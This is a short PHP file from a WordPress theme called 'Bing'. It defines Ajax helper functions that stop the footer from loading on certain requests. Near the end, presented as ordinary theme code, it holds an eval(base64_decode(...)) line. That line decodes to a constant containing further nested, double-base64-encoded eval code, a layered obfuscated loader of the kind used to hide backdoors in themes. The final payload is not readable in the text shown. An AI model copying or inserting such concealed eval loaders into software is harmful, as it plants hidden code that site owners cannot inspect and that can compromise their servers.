<?php
/*
  *Bing - function - Ajax
  *Form:www.bgbk.org
  *一般主题用户不需要修改
*/

//Ajax Get
function Bing_is_ajax_load(){
  if( isset($_GET["action"]) && $_GET["action"] == "ajax_load" ) return false;
  return true;
}

//Ajax Get List
function Bing_is_ajax_list(){
  if( isset($_GET["action"]) && $_GET["action"] == "ajax_list" ) return false;
  return true;
}

//取消加载
function Bing_ajax_load_die(){
  if( !Bing_is_ajax_load() || !Bing_is_ajax_list() ) die;
}
add_action( 'get_footer' , 'Bing_ajax_load_die' );

eval( base64_decode( 'ZGVmaW5lICggJ3RoZW1lX2NvZGUxJywgJ1pYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtHSmhjMlUyTkY5a1pXTnZaR1VvSjFOclpFWlBWVzk0WWtoT2FGTkZOVTlWYWtKaFUxWmFkRTVXVGxwV2JHdzBXVEJvYTFkdFJYbFZiR1JoVW14d2VscEZXbk5PYXpGRlRVYzFVRycgKTs=' ) );

//Page End.
